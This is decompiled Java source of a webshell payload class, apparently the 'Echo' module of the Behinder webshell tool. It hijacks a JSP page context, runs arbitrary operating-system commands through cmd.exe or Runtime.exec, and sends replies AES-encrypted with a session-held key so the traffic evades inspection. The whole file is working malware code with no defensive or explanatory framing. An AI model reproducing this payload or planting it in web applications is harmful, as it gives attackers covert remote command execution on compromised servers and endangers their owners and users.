// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.util.Iterator;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import javax.servlet.ServletOutputStream;
import java.util.Map;
import java.util.HashMap;
import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;

public class Echo
{
    public static String content;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        page.getResponse().setCharacterEncoding("UTF-8");
        final Map<String, String> result = new HashMap<String, String>();
        try {
            result.put("msg", Echo.content);
            result.put("status", "success");
        }
        catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "success");
            try {
                final ServletOutputStream so = this.Response.getOutputStream();
                so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                so.flush();
                so.close();
                page.getOut().clear();
            }
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        finally {
            try {
                final ServletOutputStream so2 = this.Response.getOutputStream();
                so2.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                so2.flush();
                so2.close();
                page.getOut().clear();
            }
            catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return true;
    }
    
    private String RunCMD(final String cmd) throws Exception {
        final Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        String result = "";
        if (cmd != null && cmd.length() > 0) {
            Process p;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
                p = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", cmd });
            }
            else {
                p = Runtime.getRuntime().exec(cmd);
            }
            final BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
            for (String disr = br.readLine(); disr != null; disr = br.readLine()) {
                result = result + disr + "\n";
            }
            result = new String(result.getBytes(osCharset));
        }
        return result;
    }
    
    private byte[] Encrypt(final byte[] bs) throws Exception {
        final String key = this.Session.getAttribute("u").toString();
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
}
